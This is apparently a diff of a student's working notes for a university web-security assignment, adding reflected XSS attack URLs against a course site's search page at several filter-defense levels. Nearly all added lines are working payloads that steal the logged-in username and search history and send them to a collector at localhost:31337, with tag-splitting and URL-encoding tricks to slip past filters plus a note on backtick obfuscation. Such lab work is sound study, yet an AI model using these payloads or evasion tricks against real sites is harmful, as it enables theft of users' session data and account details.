@@ -20,6 +20,22 @@ https://project2.ecen4133.org/search?xssdefense=0&q=<script>$(window).load(funct
 xxx_0 PLAIN solution:
 https://project2.ecen4133.org/search?xssdefense=0&q=<script>$(window).load(function(){window.location='http://localhost:31337/?stolen_user='+$("#logged-in-user").text()+'	&last_search='+$("#history-list").children()[1].innerHTML})</script>
 
+xss_1 ENCODED solution:
+https://project2.ecen4133.org/search?xssdefense=1&q=<scrscriptipt>$(window).load(function(){window.location='http://localhost:31337/?stolen_user='%2B$("%23logged-in-user").text()%2B'	%26last_search='%2B$("%23history-list").children()[1].innerHTML})</scrscriptipt>
+
+xss_1 Plain solution:
+https://project2.ecen4133.org/search?xssdefense=1&q=<scrscriptipt>$(window).load(function(){window.location='http://localhost:31337/?stolen_user='+$("#logged-in-user").text()+'	&last_search='+$("#history-list").children()[1].innerHTML})</scrscriptipt>
+
+
+xss_2 ENCODED:
+https://project2.ecen4133.org/search?xssdefense=2&q=<scrscriptipt>$(window).load(function(){window.location='http://localhost:31337/?stolen_user='%2B$("%23logged-in-user").text()%2B'	%26last_search='%2B$("%23history-list").children()[1].innerHTML})</scrscriptipt>
+
+xss_2 PLAIN:
+https://project2.ecen4133.org/search?xssdefense=2&q=<scrscriptipt>$(window).load(function(){window.location='http://localhost:31337/?stolen_user='+$("#logged-in-user").text()+'	&last_search='+$("#history-list").children()[1].innerHTML})</scrscriptipt>
+
+
+xss_3 test:
+https://project2.ecen4133.org/search?xssdefense=3&q=<scrscriptipt>$(window).load(function(){window.location='`http://localhost:31337/?stolen_user='`%2B$("`%23logged-in-user"`).text()%2B'`	%26last_search='`%2B$("`%23history-list"`).children()[1].innerHTML})</scrscriptipt>
 
 
 Alert tests: 
@@ -28,6 +44,8 @@ Alert tests:
 <script>alert($("#history-list").children()[0].text)</script>
 
 <script>alert($("#logged-in-user").text())</script>
+<scrscriptipt> `alert("this is a test")` </scrscriptipt>
+#this is called grave accent obfuscation, this works in small scale with an alert but im having trouble in the full link.
 
 
 malicious URL just stolen user (does not work):
